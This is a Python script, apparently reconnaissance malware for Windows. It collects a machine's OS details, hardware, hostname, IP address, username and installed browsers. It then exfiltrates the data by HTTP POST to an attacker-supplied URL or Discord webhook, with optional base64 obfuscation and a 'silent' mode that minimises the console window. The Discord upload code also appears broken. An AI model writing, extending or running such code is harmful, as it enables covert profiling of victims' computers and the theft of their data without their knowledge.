import platform
import psutil
import requests
import base64
import json
import socket
import subprocess
import ctypes
import os

def get_system_info():
    system_info = {
        'OS': platform.system() + ' ' + platform.release(),
        'OS Version': platform.version(),
        'Architecture': platform.architecture()[0],
        'Processor': platform.processor(),
        'CPU Cores': psutil.cpu_count(logical=True),
        'RAM': str(round(psutil.virtual_memory().total / (1024 ** 3))) + ' GB',
        'Disk Space': str(round(psutil.disk_usage('/').total / (1024 ** 3))) + ' GB',
        'Hostname': socket.gethostname(),
        'IP Address': socket.gethostbyname(socket.gethostname()),
        'User': os.getenv('USERNAME'),
        'Browsers': get_installed_browsers()
    }
    return system_info

def get_installed_browsers():
    browsers = []
    for path in [
        r'C:\Program Files\Google\Chrome\Application\chrome.exe',
        r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe',
        r'C:\Program Files\Mozilla Firefox\firefox.exe',
        r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe',
        r'C:\Program Files\Microsoft\Edge\Application\msedge.exe',
        r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe',
        r'C:\Program Files\Opera\launcher.exe',
        r'C:\Program Files (x86)\Opera\launcher.exe',
        r'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe',
        r'C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe'
    ]:
        if os.path.exists(path):
            browsers.append(os.path.basename(path).split('.')[0])
    return browsers

def exfiltrate_system_info(target, encrypt=False, stealth=False, silent=False, testing=False):
    try:
        system_info = get_system_info()
        if encrypt:
            system_info = base64.b64encode(json.dumps(system_info).encode()).decode()
        if target.startswith('http'):
            requests.post(target, data={'system_info': system_info})
        elif target.startswith('discord'):
            webhook_url = target
            data = {"content": f"System Info Exfiltrated", "files": [("system_info.json", json.dumps(system_info).encode())]}
            requests.post(webhook_url, files=data)
        elif target == 'file':
            with open('exfiltrated_system_info.json', 'w') as f:
                json.dump(system_info, f, indent=4)
        if testing:
            print(f"System info exfiltrated to {target}")
    except Exception as e:
        if testing:
            print(f"Error exfiltrating system info: {e}")

    if silent:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # Minimize the command window